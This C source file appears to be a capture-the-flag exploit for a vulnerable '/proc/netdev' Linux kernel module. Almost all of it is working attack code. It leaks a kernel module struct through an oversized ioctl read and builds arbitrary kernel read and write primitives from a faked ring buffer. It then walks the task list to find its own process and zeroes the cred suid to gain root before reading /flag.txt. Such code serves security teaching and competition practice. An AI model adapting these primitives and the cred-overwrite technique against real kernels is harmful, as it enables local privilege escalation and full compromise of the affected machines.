#include "netdev.h"
#include <assert.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <unistd.h>

#define __kernel

#define container_of(ptr, type, member)                                        \
    ({                                                                         \
        void *__mptr = (void *)(ptr);                                          \
        ((type *)(__mptr - offsetof(type, member)));                           \
    })

// Hardcoded offsets in the base kernel image
struct kernel_symbols {
    uint64_t init_task;
    uint64_t modules;
};

// Hardcoded offsets in the kernel module
struct module_symbols {
    uint64_t netdev;
    uint64_t __this_module;
};

// We can cause type confusion and send an advertisement
// with the ringbuffer struct
struct ring_buffer {
    uint64_t head;
    uint64_t tail;
    uint64_t cap;
    uint8_t __kernel *ptr;
};

const struct kernel_symbols kernel_offsets = {
    .init_task = 0x2084880,
    .modules = 0x210a038,
};

const struct module_symbols module_offsets = {
    .netdev = 0x2028,
    .__this_module = 0x2880,
};

struct netdev_t {
    uint8_t _offset0[0x2a];
    uint8_t ip_address[6];
};

// We can leak the kernel module metadata
struct module {
    uint64_t buf;
    void __kernel *modules; // Pointer to the `modules` struct
};

struct list_head {
    struct list_head __kernel *next;
    struct list_head __kernel *prev;
};

// Kernel struct containing process information
struct task_struct {
    uint8_t _offset0[0x400];
    struct list_head tasks; // offset 0x400
    uint8_t _offset1[0xc0];
    int32_t pid; // offset 0x4d0
    uint8_t _offset2[0x1d0];
    void __kernel *cred; // offset 0x6a8
};

// Kernel struct containing privileges
struct cred {
    uint8_t _offset0[16];
    uint32_t suid;
};

struct task_struct __kernel *next_task(int fd,
                                       struct task_struct __kernel *task);

size_t kread(int fd, void *dst, void __kernel *src, size_t count);
size_t kwrite(int fd, void __kernel *dst, const void *src, size_t count);

int main() {
    setbuf(stdout, NULL);
    puts("Opening /proc/netdev");
    int fd = open("/proc/netdev", O_RDWR);
    assert(fd >= 0);

    int result = ioctl(fd, NETDEV_CHANGE_MODE, MODE_UNICAST);
    if (result != 0) {
        perror("change mode failed");
        abort();
    }

    // Get the offset from the start of the buffer to `__this_module`
    size_t offset =
        module_offsets.__this_module -
        (module_offsets.netdev + offsetof(struct netdev_t, ip_address));

    // Leak the `__this_module` struct
    size_t dst_size = offset + sizeof(struct module) + sizeof(enum ip_version);
    struct ip_address *dst = malloc(dst_size);
    assert(dst != NULL);
    dst->version = dst_size - sizeof(enum ip_version);

    // Version is treated as the length
    printf("Leaking %d bytes\n", dst->version);
    result = ioctl(fd, NETDEV_GET_DESTINATION, dst);
    if (result != 0) {
        perror("get dest failed");
        abort();
    }

    // We leaked `__this_module`, which contains a pointer to `modules`
    struct module *this_module = (void *)&dst->address + offset;
    printf("`modules` is at %p\n", this_module->modules);

    // Calculate the address of `init_task` using the hardcoded offset
    struct task_struct __kernel *init_task =
        this_module->modules -
        (kernel_offsets.modules - kernel_offsets.init_task);
    printf("`init_task` is at %p\n", init_task);

    int32_t current_pid = getpid();
    printf("Current pid %d\n", current_pid);

    // Search for the task struct for our pid
    struct task_struct __kernel *current_task = NULL;
    struct task_struct __kernel *task = init_task;
    while ((task != NULL) && ((task = next_task(fd, task)) != init_task)) {
        int32_t pid;
        kread(fd, &pid, &task->pid, sizeof(int32_t));

        if (pid == current_pid) {
            current_task = task;
            break;
        }
    }

    if (current_task == NULL) {
        puts("Could not find current task");
        abort();
    }
    printf("Found current task_struct at %p\n", current_task);

    // Find current cred struct
    struct cred __kernel *cred;
    kread(fd, &cred, &current_task->cred, sizeof(void *));
    printf("Cred struct is at %p\n", cred);

    uint32_t old_euid = geteuid();
    printf("Current euid %d\n", old_euid);

    // Overwrite cred
    uint32_t zero = 0;
    kwrite(fd, &cred->suid, &zero, sizeof(uint32_t));
    seteuid(0);
    printf("New euid %d\n", geteuid());

    int flag = open("/flag.txt", O_RDONLY);
    if (flag < 0) {
        perror("Could not open /flag.txt");
        abort();
    }

    printf("\nGot flag ");
    sendfile(1, flag, NULL, 64);
}

// Get container_of(task->tasks.next, struct task_struct, tasks.next)
struct task_struct __kernel *next_task(int fd,
                                       struct task_struct __kernel *task) {
    struct task_struct __kernel *next;
    kread(fd, &next, &task->tasks.next, sizeof(void *));
    return container_of(next, struct task_struct, tasks.next);
}

// Arbitrary read primitive
size_t kread(int fd, void *dst, void __kernel *src, size_t count) {
    // Change to broadcast mode
    int result = ioctl(fd, NETDEV_CHANGE_MODE, MODE_BROADCAST);
    if (result != 0) {
        perror("change mode to broadcast failed");
        abort();
    }

    // Create the fake ringbuffer
    struct ring_buffer fake_ringbuf = {
        .head = 0, .tail = count, .cap = UINT64_MAX, .ptr = src};

    // Send the advertisement
    result = ioctl(fd, NETDEV_SEND_ADVERTISEMENT, &fake_ringbuf);
    if (result != 0) {
        perror("send advertisement failed");
        abort();
    }

    // Change to loopback mode
    result = ioctl(fd, NETDEV_CHANGE_MODE, MODE_LOOPBACK);
    if (result != 0) {
        perror("Change mode to loopback failed");
        abort();
    }

    // Read from the device
    ssize_t s = read(fd, dst, count);
    if (s < 0) {
        perror("Failed to read");
        abort();
    }

    return s;
}

// Arbitrary write primitive
size_t kwrite(int fd, void __kernel *dst, const void *src, size_t count) {
    // Change to broadcast mode
    int result = ioctl(fd, NETDEV_CHANGE_MODE, MODE_BROADCAST);
    if (result != 0) {
        perror("change mode to broadcast failed");
        abort();
    }

    // Create the fake ringbuffer
    struct ring_buffer fake_ringbuf = {
        .head = 0, .tail = 0, .cap = UINT64_MAX, .ptr = dst};

    // Send the advertisement
    result = ioctl(fd, NETDEV_SEND_ADVERTISEMENT, &fake_ringbuf);
    if (result != 0) {
        perror("send advertisement failed");
        abort();
    }

    // Change to loopback mode
    result = ioctl(fd, NETDEV_CHANGE_MODE, MODE_LOOPBACK);
    if (result != 0) {
        perror("Change mode to loopback failed");
        abort();
    }

    // Write to the device
    ssize_t s = write(fd, src, count);
    if (s < 0) {
        perror("Failed to write");
        abort();
    }

    return s;
}
